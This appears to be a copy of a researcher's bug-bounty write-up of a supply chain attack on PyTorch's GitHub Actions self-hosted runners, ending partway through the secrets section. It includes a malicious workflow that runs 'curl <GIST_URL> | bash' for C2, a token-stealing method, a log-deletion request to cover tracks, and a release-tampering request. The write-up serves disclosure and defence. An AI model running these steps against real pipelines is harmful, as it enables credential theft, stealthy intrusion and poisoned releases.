<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/">Original</a>
    <h1>A supply chain attack on PyTorch</h1>
    
    <div id="readability-page-1" class="page"><div>
<p>Security tends to lag behind adoption, and AI/ML is no exception. </p>



<p>Four months ago, <a href="https://adnanthekhan.com/">Adnan Khan</a> and I exploited a critical CI/CD vulnerability in <a href="https://github.com/pytorch/pytorch">PyTorch</a>, one of the world’s leading ML platforms. Used by titans like <strong>Google, Meta, Boeing, and Lockheed Martin</strong>, PyTorch is a major target for hackers and nation-states alike. </p>



<p>Thankfully, we exploited this vulnerability before the bad guys.</p>



<p>Here is how we did it.</p>







<p>Before we dive in, let’s scope out and discuss why Adnan and I were looking at an ML repository. Let me give you a hint — it was not to gawk at the neural networks. In fact, I don’t know enough about neural networks to be qualified to gawk.</p>



<p>PyTorch was one of the first steps on a journey Adnan and I started six months ago, based on CI/CD research and exploit development we performed in the summer of 2023. Adnan started the bug bounty foray by leveraging these attacks to exploit a <a href="https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/">critical vulnerability in GitHub</a>, collecting a $20,000 reward. Following this attack, we teamed up to discover other vulnerable repositories.</p>



<p>The results of our research surprised everyone, including ourselves, as we continuously executed<strong> supply chain compromises of </strong><a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/"><strong>leading ML platforms, billion-dollar Blockchains,</strong></a><strong> and more</strong>. In the seven days since we released our initial blog posts, they’ve <a href="https://www.securityweek.com/major-it-crypto-firms-exposed-to-supply-chain-compromise-via-new-class-of-ci-cd-attack/">caught on in the security world</a>. </p>



<p>But, you probably didn’t come here to read about our journey; you came to read about the messy details of our attack on PyTorch. Let’s begin.</p>







<p>Our exploit path resulted in the ability to upload malicious PyTorch releases to GitHub, upload releases to AWS, potentially add code to the main repository branch, backdoor PyTorch dependencies – the list goes on. <strong>In short, it was bad. Quite bad. </strong></p>



<p>As we’ve seen before with <a href="https://www.techtarget.com/whatis/feature/SolarWinds-hack-explained-Everything-you-need-to-know">SolarWinds</a>, <a href="https://www.coindesk.com/consensus-magazine/2023/12/14/what-we-know-about-the-massive-ledger-hack/">Ledger</a>, and others, supply chain attacks like this are killer from an attacker’s perspective. <strong>With this level of access, any respectable nation-state would have several paths to a PyTorch supply chain compromise</strong>.</p>







<p>To understand our exploit, you need to understand GitHub Actions.</p>



<p><em>Want to skip around? Go ahead</em>.</p>



<ol><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#background">Background</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#tell-me-the-impact">Tell Me the Impact</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#github-actions-primer">GitHub Actions Primer</a><ol><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#self-hosted-runners">Self-Hosted Runners</a></li></ol></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#identifying-the-vulnerability">Identifying the Vulnerability</a><ol><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#identifying-self-hosted-runners">Identifying Self-Hosted Runners</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#determining-workflow-approval-requirements">Determining Workflow Approval Requirements</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#searching-for-impact">Searching for Impact</a></li></ol></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#executing-the-attack">Executing the Attack</a><ol><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#1-fixing-a-typo">1. Fixing a Typo</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#2-preparing-the-payload">2. Preparing the Payload</a></li></ol></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#post-exploitation">Post Exploitation</a><ol><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#the-great-secret-heist">The Great Secret Heist</a><ol><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#the-magical-github-token">The Magical GITHUB_TOKEN</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#covering-our-tracks">Covering our Tracks</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#modifying-repository-releases">Modifying Repository Releases</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#repository-secrets">Repository Secrets</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#pat-access">PAT Access</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#aws-access">AWS Access</a></li></ol></li></ol></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#submission-details-no-bueno">Submission Details – No Bueno</a><ol><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#timeline">Timeline</a></li></ol></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#mitigations">Mitigations</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#is-pytorch-an-outlier">Is PyTorch an Outlier?</a></li><li><a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#references">References</a></li></ol>



<p>If you’ve never worked with GitHub Actions or similar CI/CD platforms, I recommend <a href="https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions">reading up</a> before continuing this blog post. Actually, if I lose you at any point, go and Google the technology that confused you. Typically, I like to start from the very basics in my articles, but explaining all the involved CI/CD processes would be a novel in itself.</p>



<p>In short, <strong>GitHub Actions allow the execution of code specified within workflows as part of the CI/CD process.</strong> </p>



<p>For example, let’s say PyTorch wants to run a set of tests when a GitHub user submits a pull request. PyTorch can define these tests in a YAML workflow file used by GitHub Actions and configure the workflow to run on the <em>pull_request</em> trigger. Now, whenever a user submits a pull request, the tests will execute on a runner. This way, repository maintainers don’t need to manually test everyone’s code before merging. </p>



<p>The public PyTorch repository uses GitHub Actions extensively for CI/CD. Actually, extensively is an understatement. PyTorch has over 70 different GitHub workflows and typically runs over ten workflows every hour. One of the most difficult parts of this operation was scrolling through all of the different workflows to select the ones we were interested in.</p>



<p>GitHub Actions workflows execute on two types of build runners. One type is GitHub’s hosted runners, which GitHub maintains and hosts in their environment. <strong>The other class is self-hosted runners.</strong></p>



<h2 id="self-hosted-runners">Self-Hosted Runners</h2>



<p>Self-hosted runners are build agents hosted by end users running the Actions runner agent on their own infrastructure. In less technical terms, a “self-hosted runner” is a machine, VM, or container configured to run GitHub workflows from a GitHub organization or repository. Securing and protecting the runners is the responsibility of end users, not GitHub, which is why GitHub recommends against using self-hosted runners on public repositories. <strong>Apparently, not everyone listens to GitHub, </strong><a href="https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/"><strong>including GitHub</strong></a><strong>.</strong></p>



<p>It doesn’t help that some of GitHub’s default settings are less than secure. By default, when a self-hosted runner is attached to a repository, any of that repository’s workflows can use that runner. This setting also applies to workflows from fork pull requests. Remember that <strong>anyone </strong>can submit a fork pull request to a public GitHub repository. <strong>Yes, even you.</strong> The result of these settings is that, by default, any repository contributor can execute code on the self-hosted runner by submitting a malicious PR.</p>



<p><em>Note: A “contributor” to a GitHub repository is anyone who has added code to the repository. Typically, someone becomes a contributor by submitting a pull request that then gets merged into the default branch. More on this later.</em></p>



<p>If the self-hosted runner is configured using the default steps, it will be a non-ephemeral self-hosted runner. This means that the malicious workflow can start a process in the background that will continue to run after the job completes, and modifications to files (such as programs on the path, etc.) will persist past the current workflow. It also means that <strong>future workflows will run on that same runner</strong>.</p>







<h2 id="identifying-self-hosted-runners">Identifying Self-Hosted Runners</h2>



<p>To identify self-hosted runners, we ran <a href="https://github.com/praetorian-inc/gato">Gato</a>, a GitHub attack and exploitation tool developed by <a href="https://www.praetorian.com/">Praetorian</a>. Among other things, Gato can enumerate the existence of self-hosted runners within a repository by examining GitHub workflow files and run logs. </p>



<p>Gato identified several persistent, self-hosted runners used by the PyTorch repository. We looked at repository workflow logs to confirm the Gato output.</p>



<figure><img data-attachment-id="594" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-2-2/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-2.png" data-orig-size="1504,834" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-2" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-2.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-2.png?w=1024" width="1504" height="834" src="https://johnstawinski.files.wordpress.com/2024/01/image-2.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-2.png 1504w, https://johnstawinski.files.wordpress.com/2024/01/image-2.png?w=150&amp;h=83 150w, https://johnstawinski.files.wordpress.com/2024/01/image-2.png?w=300&amp;h=166 300w, https://johnstawinski.files.wordpress.com/2024/01/image-2.png?w=768&amp;h=426 768w, https://johnstawinski.files.wordpress.com/2024/01/image-2.png?w=1024&amp;h=568 1024w" sizes="(max-width: 1504px) 100vw, 1504px"/></figure>



<p><em>The name “worker-rocm-amd-30” indicates the runner is self-hosted.</em></p>



<h2 id="determining-workflow-approval-requirements">Determining Workflow Approval Requirements</h2>



<p>Even though PyTorch used self-hosted runners, one major thing could still stop us.</p>



<p>The default setting for workflow execution from fork PRs requires approval only for accounts that have not previously contributed to the repository. However, there is an option to allow workflow approval for all fork PRs, including previous contributors. <strong>We set out to discover the status of this setting.</strong></p>



<p>Viewing the pull request (PR) history, we found several PRs from previous contributors that triggered <em>pull_request</em> workflows without requiring approval. This indicated that the repository did not require workflow approval for Fork PRs from previous contributors. <strong>Bingo.</strong></p>



<figure><img data-attachment-id="607" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-12/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-12.png" data-orig-size="848,1600" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-12" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-12.png?w=159" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-12.png?w=543" width="848" height="1600" src="https://johnstawinski.files.wordpress.com/2024/01/image-12.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-12.png 848w, https://johnstawinski.files.wordpress.com/2024/01/image-12.png?w=80&amp;h=150 80w, https://johnstawinski.files.wordpress.com/2024/01/image-12.png?w=159&amp;h=300 159w, https://johnstawinski.files.wordpress.com/2024/01/image-12.png?w=768&amp;h=1449 768w" sizes="(max-width: 848px) 100vw, 848px"/></figure>



<p><em>Nobody had approved this fork PR workflow, yet the “Lint / quick-checks / linux-job” workflow ran on </em>pull_request<em>, indicating the default approval setting was likely in place.</em></p>



<h2 id="searching-for-impact">Searching for Impact</h2>



<p>Before executing these attacks, we like to identify GitHub secrets that we may be able to steal after landing on the runner. Workflow files revealed several GitHub secrets used by PyTorch, including but not limited to:</p>



<ul>
<li>“aws-pytorch-uploader-secret-access-key”</li>



<li>“aws-access-key-id”</li>



<li>“GH_PYTORCHBOT_TOKEN” (GitHub Personal Access Token)</li>



<li>“UPDATEBOT_TOKEN” (GitHub Personal Access Token)</li>



<li>“conda-pytorchbot-token”</li>
</ul>



<p>We were psyched when we saw the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN. <strong>A PAT is one of your most valuable weapons if you want to launch a supply chain attack.</strong></p>



<p>Using self-hosted runners to compromise GitHub secrets is not always possible. Much of our research has been around self-hosted runner post-exploitation; figuring out methods to go from runner to secrets.  PyTorch provided a great opportunity to test these techniques in the wild.</p>







<h2 id="1-fixing-a-typo">1. Fixing a Typo</h2>



<p>We needed to be a contributor to the PyTorch repository to execute workflows, but we didn’t feel like spending time adding features to PyTorch. Instead, we found a typo in a markdown file and submitted a fix. <strong>Another win for the Grammar Police.</strong></p>



<figure><img data-attachment-id="601" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-11/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-11.png" data-orig-size="558,654" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-11" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-11.png?w=256" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-11.png?w=558" loading="lazy" width="558" height="654" src="https://johnstawinski.files.wordpress.com/2024/01/image-11.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-11.png 558w, https://johnstawinski.files.wordpress.com/2024/01/image-11.png?w=128&amp;h=150 128w, https://johnstawinski.files.wordpress.com/2024/01/image-11.png?w=256&amp;h=300 256w" sizes="(max-width: 558px) 100vw, 558px"/></figure>



<p><em>Yes, I’m re-using this meme from my </em><a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/"><em>last article</em></a><em>, but it fits too well.</em></p>



<h2 id="2-preparing-the-payload">2. Preparing the Payload</h2>



<p>Now we had to craft a workflow payload that would allow us to obtain persistence on the self-hosted runner. Red Teamers know that installing persistence in production environments typically isn’t as trivial as a reverse Netcat shell. EDR, firewalls, packet inspection, and more can be in play, particularly in large corporate environments. </p>



<p>When we started these attacks, we asked ourselves the following question – what could we use for C2 that we know for sure would bypass EDR with traffic that would not be blocked by any firewall? The answer is elegant and obvious – <strong>we could install another self-hosted GitHub runner</strong> and attach it to our private GitHub organization. </p>



<p>Our “Runner on Runner” (RoR) technique uses the same servers for C2 as the existing runner, and the only binary we drop is the official GitHub runner agent binary, which is already running on the system. See ya, EDR and firewall protections.</p>



<p>We created a script to automate the runner registration process and included that as our malicious workflow payload. Storing our payload in a gist, we submitted a malicious draft PR. The modified workflow looked something like this:</p>



<blockquote>
<p>name: “🚨 pre-commit”</p>



<p>run-name: “Refactoring and cleanup”</p>



<p>on:</p>



<p> pull_request:</p>



<p>   branches: main</p>



<p>jobs:</p>



<p> build:</p>



<p>   name: Linux ARM64</p>



<p>   runs-on: ${{ matrix.os }}</p>



<p>   strategy:</p>



<p>     matrix:</p>



<p>       os: [</p>



<p>             {system: “ARM64”, name: “Linux ARM64”},</p>



<p>             {system: “benchmark”, name: “Linux Intel”},</p>



<p>             {system: “glue-notify”, name: “Windows Intel”}</p>



<p>       ]</p>



<p>   steps:</p>



<p>     – name: Lint Code Base</p>



<p>       continue-on-error: true</p>



<p>       env:</p>



<p>          VERSION: ${{ matrix.version }}</p>



<p>          SYSTEM_NAME: ${{ matrix.os }}</p>



<p>       run: curl &lt;GIST_URL&gt; | bash</p>
</blockquote>



<p>This workflow executes the RoR gist payload on three of PyTorch’s self-hosted runners – a Linux ARM64 machine named “ARM64”, an Intel device named “benchmark,” and a Windows box named “glue-notify.” </p>



<p>Enabling draft status ensured that repository maintainers wouldn’t receive a notification. However, with the complexity of PyTorch’s CI/CD environment, I’d be surprised if they noticed either way. We submitted the PR and installed our RoR C2 on each self-hosted runner.</p>



<figure><img data-attachment-id="599" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-7/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-7.png" data-orig-size="1600,868" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-7" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-7.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-7.png?w=1024" loading="lazy" width="1600" height="868" src="https://johnstawinski.files.wordpress.com/2024/01/image-7.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-7.png 1600w, https://johnstawinski.files.wordpress.com/2024/01/image-7.png?w=150&amp;h=81 150w, https://johnstawinski.files.wordpress.com/2024/01/image-7.png?w=300&amp;h=163 300w, https://johnstawinski.files.wordpress.com/2024/01/image-7.png?w=768&amp;h=417 768w, https://johnstawinski.files.wordpress.com/2024/01/image-7.png?w=1024&amp;h=556 1024w" sizes="(max-width: 1600px) 100vw, 1600px"/></figure>



<p><em>We used our C2 repository to execute the </em>pwd &amp;&amp; ls &amp;&amp; /home &amp;&amp; ip a<em> command on the runner labeled “jenkins-worker-rocm-amd-34”, confirming stable C2 and remote code execution. We also ran </em>sudo -l <em>to confirm we had root access.</em></p>







<p>We now had root a self-hosted runner. <strong>So what?</strong> We had seen previous reports of gaining RCE on self-hosted runners, and they were often met with ambiguous responses due to their ambiguous impact. Given the complexity of these attacks, we wanted to demonstrate a legitimate impact on PyTorch to convince them to take our report seriously. And we had some cool new post-exploitation techniques we’d been wanting to try.</p>



<h2 id="the-great-secret-heist">The Great Secret Heist</h2>



<p>In cloud and CI/CD environments, <strong>secrets are king</strong>. When we began our post-exploitation research, we focused on the secrets an attacker could steal and leverage in a typical self-hosted runner setup. Most of the secret stealing starts with the <em>GITHUB_TOKEN</em>. </p>



<h3 id="the-magical-github-token">The Magical GITHUB_TOKEN</h3>



<p>Typically, a workflow needs to checkout a GitHub repository to the runner’s filesystem, whether to run tests defined in the repository, commit changes, or even publish releases. The workflow can use a <em>GITHUB_TOKEN </em>to authenticate to GitHub and perform these operations. <em>GITHUB_TOKEN</em> permissions can vary from read-only access to extensive write privileges over the repository. If a workflow executes on a self-hosted runner and uses a <em>GITHUB_TOKEN</em>, that token will be on the runner for the duration of that build.</p>



<p>PyTorch had several workflows that used the <em>actions/checkout</em> step with a <em>GITHUB_TOKEN</em> that had <strong>write permissions</strong>. For example, by searching through workflow logs, we can see the <em>periodic.yml</em> workflow also ran on the <em>jenkins-worker-rocm-amd-34</em> self-hosted runner. The logs confirmed that this workflow used a <em>GITHUB_TOKEN</em> with extensive write permissions. </p>



<figure><img data-attachment-id="595" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-3/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-3.png" data-orig-size="1094,998" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-3" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-3.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-3.png?w=1024" loading="lazy" width="1094" height="998" src="https://johnstawinski.files.wordpress.com/2024/01/image-3.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-3.png 1094w, https://johnstawinski.files.wordpress.com/2024/01/image-3.png?w=150&amp;h=137 150w, https://johnstawinski.files.wordpress.com/2024/01/image-3.png?w=300&amp;h=274 300w, https://johnstawinski.files.wordpress.com/2024/01/image-3.png?w=768&amp;h=701 768w, https://johnstawinski.files.wordpress.com/2024/01/image-3.png?w=1024&amp;h=934 1024w" sizes="(max-width: 1094px) 100vw, 1094px"/></figure>



<p>This token would only be valid for the life of that particular build. However, we developed some special techniques to extend the build length once you are on the runner (more on this in a future post). Due to the insane number of workflows that run daily from the PyTorch repository, we were not worried about tokens expiring, as we could always compromise another one.</p>



<p>When a workflow uses the <em>actions/checkout</em> step, the <em>GITHUB_TOKEN</em> is stored in the <em>.git/config</em> file of the checked-out repository on the self-hosted runner during an active workflow. Since we controlled the runner, all we had to do was wait until a non-PR workflow ran on the runner with a privileged <em>GITHUB_TOKEN</em> and then print out the contents of the <em>config</em> file. </p>



<figure><img data-attachment-id="597" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-6/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-6.png" data-orig-size="1600,695" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-6" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-6.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-6.png?w=1024" loading="lazy" width="1600" height="695" src="https://johnstawinski.files.wordpress.com/2024/01/image-6.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-6.png 1600w, https://johnstawinski.files.wordpress.com/2024/01/image-6.png?w=150&amp;h=65 150w, https://johnstawinski.files.wordpress.com/2024/01/image-6.png?w=300&amp;h=130 300w, https://johnstawinski.files.wordpress.com/2024/01/image-6.png?w=768&amp;h=334 768w, https://johnstawinski.files.wordpress.com/2024/01/image-6.png?w=1024&amp;h=445 1024w" sizes="(max-width: 1600px) 100vw, 1600px"/></figure>



<p><strong><em>We used our RoR C2 to steal the </em></strong><strong>GITHUB_TOKEN</strong><strong><em> of an ongoing workflow with write permissions.</em></strong></p>



<h3 id="covering-our-tracks">Covering our Tracks</h3>



<p>Our first use of the <em>GITHUB_TOKEN</em> was to eliminate the run logs from our malicious pull request. We wanted a full day to perform post-exploitation and didn’t want to cause any alarms from our activity. We used the GitHub API along with the token to delete the run logs for each of the workflows our PR triggered. <strong>Stealth mode = activated.</strong></p>



<blockquote>
<p>curl -L \</p>



<p>  -X DELETE \</p>



<p>  -H “Accept: application/vnd.github+json” \</p>



<p>  -H “Authorization: Bearer $STOLEN_TOKEN” \</p>



<p>  -H “X-GitHub-Api-Version: 2022-11-28” \</p>



<p>&lt;a href=&#34;<a href="https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/" rel="nofollow">https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/</a>&lt;run_id&gt;</p>
</blockquote>



<p>If you want a challenge, you can try to discover the workflows associated with our initial malicious PR and observe that the logs no longer exist. In reality, they likely wouldn’t have caught our workflows anyway. PyTorch has so many workflow runs that it reaches the limit for a single repository after a few days.</p>



<h3 id="modifying-repository-releases">Modifying Repository Releases</h3>



<p>Using the token, <strong>we could upload an asset claiming to be a pre-compiled, ready-to-use PyTorch binary</strong> and add a release note with instructions to run and download the binary. Any users that downloaded the binary would then be running our code. If the current source code assets were not pinned to the release commit, the attacker could overwrite those assets directly. As a POC, we used the following cURL request to modify the name of a PyTorch GitHub release. We just as easily could have uploaded our own assets.</p>



<blockquote>
<p>curl -L \</p>



<p>  -X PATCH \</p>



<p>  -H “Accept: application/vnd.github+json” \</p>



<p>  -H “Authorization: Bearer $GH_TOKEN” \</p>



<p>  -H “X-GitHub-Api-Version: 2022-11-28” \</p>



<p>  <a href="https://api.github.com/repos/pytorch/pytorch/releases/102257798" rel="nofollow">https://api.github.com/repos/pytorch/pytorch/releases/102257798</a> \</p>



<p>  -d ‘{“tag_name”:”v2.0.1″,”name”:”PyTorch 2.0.1 Release, bug fix release (- John Stawinski)”}’</p>
</blockquote>



<figure><img data-attachment-id="603" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-10/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-10.png" data-orig-size="1600,879" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-10" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-10.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-10.png?w=1024" loading="lazy" width="1600" height="879" src="https://johnstawinski.files.wordpress.com/2024/01/image-10.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-10.png 1600w, https://johnstawinski.files.wordpress.com/2024/01/image-10.png?w=150&amp;h=82 150w, https://johnstawinski.files.wordpress.com/2024/01/image-10.png?w=300&amp;h=165 300w, https://johnstawinski.files.wordpress.com/2024/01/image-10.png?w=768&amp;h=422 768w, https://johnstawinski.files.wordpress.com/2024/01/image-10.png?w=1024&amp;h=563 1024w" sizes="(max-width: 1600px) 100vw, 1600px"/></figure>



<p><em>As a POC, we added my name to the latest PyTorch release at the time. A malicious attacker could execute a similar API request to replace the latest release artifact with their malicious artifact.</em></p>



<h3 id="repository-secrets">Repository Secrets</h3>



<p>If backdooring PyTorch repository releases sounds fun, well, <strong>that is only a fraction of the impact we achieved </strong>when we looked at repository secrets.</p>



<p>The PyTorch repository used GitHub secrets to allow the runners to access sensitive systems during the automated release process. The repository used <strong>a lot</strong> of secrets, including several sets of AWS keys and GitHub Personal Access Tokens (PATs) discussed earlier.</p>



<p>Specifically, the <em>weekly.yml </em>workflow used the <em>GH_PYTORCHBOT_TOKEN</em> and <em>UPDATEBOT_TOKEN</em> secrets to authenticate to GitHub. GitHub Personal Access Tokens (PATs) are often overprivileged, making them a great target for attackers. This workflow did not run on a self-hosted runner, so we couldn’t wait for a run and then steal the secrets from the filesystem (a technique we use frequently).</p>



